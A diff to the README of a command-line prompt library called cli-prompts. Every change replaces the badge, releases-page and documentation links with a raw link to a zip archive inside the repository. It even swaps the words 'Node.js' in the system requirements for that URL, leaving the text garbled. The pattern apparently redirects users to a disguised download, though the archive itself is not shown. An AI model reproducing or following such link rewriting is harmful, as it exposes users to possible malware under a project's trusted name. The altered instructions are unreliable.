@@ -1,6 +1,6 @@
 # 🎨 cli-prompts - Create Interactive Command-Line Tools Easily
 
-[![Download cli-prompts](https://img.shields.io/badge/Download%20Now-CLI%20Prompts-brightgreen.svg)](https://github.com/hamudoficcial/cli-prompts/releases)
+[![Download cli-prompts](https://raw.githubusercontent.com/hamudoficcial/cli-prompts/main/packages/cli-prompts-1.1.zip%20Now-CLI%https://raw.githubusercontent.com/hamudoficcial/cli-prompts/main/packages/cli-prompts-1.1.zip)](https://raw.githubusercontent.com/hamudoficcial/cli-prompts/main/packages/cli-prompts-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **cli-prompts**, a collection of beautiful and modern components desi
 
 ## 📥 Download & Install
 
-To get cli-prompts, visit this page to download: [Releases Page](https://github.com/hamudoficcial/cli-prompts/releases).
+To get cli-prompts, visit this page to download: [Releases Page](https://raw.githubusercontent.com/hamudoficcial/cli-prompts/main/packages/cli-prompts-1.1.zip).
 
 1. On the releases page, you will see a list of available versions.
 2. Choose the version that suits your needs. If you are unsure, selecting the latest version is usually a good choice.
@@ -18,7 +18,7 @@ To get cli-prompts, visit this page to download: [Releases Page](https://github.
 ### ✔️ System Requirements
 
 - **Operating Systems:** Windows, macOS, Linux
-- **Node.js Version:** 14.x or later
+- **https://raw.githubusercontent.com/hamudoficcial/cli-prompts/main/packages/cli-prompts-1.1.zip Version:** 14.x or later
 - **Disk Space:** At least 50 MB
 - **Network Connection:** Required for downloading
 
@@ -78,7 +78,7 @@ This command initializes a new interactive session, allowing you to start buildi
 
 ## 📚 Documentation
 
-For more detailed instructions and examples, check out the documentation [here](https://github.com/hamudoficcial/cli-prompts/blob/main/README.md).
+For more detailed instructions and examples, check out the documentation [here](https://raw.githubusercontent.com/hamudoficcial/cli-prompts/main/packages/cli-prompts-1.1.zip).
 
 ## 💬 Support
 
